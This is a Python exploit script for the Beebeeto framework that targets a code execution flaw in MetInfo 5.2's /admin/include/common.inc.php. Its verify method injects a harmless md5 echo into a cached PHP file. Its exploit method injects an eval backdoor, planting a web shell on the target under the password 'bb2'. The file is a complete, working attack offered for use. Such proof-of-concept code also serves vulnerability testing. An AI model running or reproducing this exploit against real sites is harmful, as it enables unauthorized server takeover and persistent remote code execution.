#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import os
import urllib2
import requests

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0065',
            'name': 'MetInfo 5.2 /admin/include/common.inc.php 代码执行漏洞 POC & Exploit',
            'author': '1024',
            'create_date': '2015-03-16',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'MetInfo',
            'vul_version': ['5.2'],
            'type': 'Code Execution',
            'tag': ['MetInfo 5.2 代码执行漏洞', '/admin/include/common.inc.php', 'php'],
            'desc': '全量覆盖met_admin_type_ok=1 就可以直接赋值无过滤赋值$languser;',
            'references': ['http://wooyun.org/bugs/wooyun-2015-094886',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        url = args['options']['target']
        payload = 'echo md5("beebeeto");//'
        name = os.urandom(3).encode('hex')
        shell_url = '%s/cache/langadmin_%s.php' % (url, name)
        verify_url = (
            '%s/admin/include/common.inc.php?met_admin_type_ok=1&langset=%s&m'
            'et_langadmin[%s][]=12345&str=%s' %
            (url, name, name, urllib2.quote(payload))
        )
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        requests.get(verify_url)
        if args['options']['verbose']:
            print '[*] Request SHELL: ' + verify_url
        content = requests.get(shell_url).content
        if '595bb9ce8726b4b55f538d3ca0ddfd76' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
            args['poc_ret']['test_shell'] = shell_url
        return args


    @classmethod
    def exploit(cls, args):
        url = args['options']['target']
        payload = 'echo md5("beebeeto");@eval($_POST["bb2"]);//'
        name = os.urandom(3).encode('hex')
        shell_url = '%s/cache/langadmin_%s.php' % (url, name)
        verify_url = (
            '%s/admin/include/common.inc.php?met_admin_type_ok=1&langset=%s&m'
            'et_langadmin[%s][]=12345&str=%s' %
            (url, name, name, urllib2.quote(payload))
        )
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        requests.get(verify_url)
        if args['options']['verbose']:
            print '[*] Request SHELL: ' + verify_url
        content = requests.get(shell_url).content
        if '595bb9ce8726b4b55f538d3ca0ddfd76' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
            args['poc_ret']['webshell'] = shell_url
            args['poc_ret']['password'] = 'bb2'
        return args


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())